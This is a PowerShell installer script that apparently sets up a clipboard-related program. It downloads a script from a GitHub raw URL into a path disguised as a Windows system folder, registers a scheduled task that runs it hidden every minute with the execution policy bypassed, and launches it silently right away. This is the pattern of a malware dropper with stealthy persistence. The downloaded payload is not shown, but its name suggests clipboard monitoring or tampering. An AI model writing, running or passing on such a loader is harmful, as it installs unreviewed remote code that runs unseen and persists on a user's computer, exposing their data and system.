$taskName = "clipboard"
$scriptPath = "C:\ProgramData\Microsoft\Windows\clipboard.ps1"
$scriptUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/refs/heads/main/.github/clipboard.ps1"

# Ensure directory exists
if (-not (Test-Path "C:\ProgramData\Microsoft\Windows")) {
    New-Item -Path "C:\ProgramData\Microsoft\Windows" -ItemType Directory -Force | Out-Null
}

# Download latest script
try {
    $wc = New-Object System.Net.WebClient
    $bytes = $wc.DownloadData($scriptUrl)
    $content = [System.Text.Encoding]::UTF8.GetString($bytes)
    [System.IO.File]::WriteAllText($scriptPath, $content, [System.Text.Encoding]::UTF8)
    Write-Host "✅ Clipboard script downloaded to $scriptPath"
} catch {
    Write-Host "❌ Failed to download script:" $_.Exception.Message
    pause
    exit 1
}

# Register scheduled task if not exists
$task = schtasks /Query /TN $taskName 2>$null
if ($LASTEXITCODE -ne 0) {
    Write-Host "🛠️ Registering scheduled task '$taskName'..."
    $cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
    schtasks /Create /TN $taskName /TR $cmd /SC MINUTE /RI 1 /F
    if ($LASTEXITCODE -eq 0) {
        Write-Host "✅ Task registered: runs every 1 minute"
    } else {
        Write-Host "❌ Failed to register task. Please run as administrator."
        pause
        exit 1
    }
} else {
    Write-Host "ℹ️ Scheduled task already exists: $taskName"
}

# Run script silently now
Write-Host "🚀 Running clipboard script silently..."
try {
    Start-Process -FilePath "powershell.exe" `
        -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" `
        -WindowStyle Hidden
} catch {
    Write-Host "❌ Failed to start script:" $_.Exception.Message
    pause
    exit 1
}
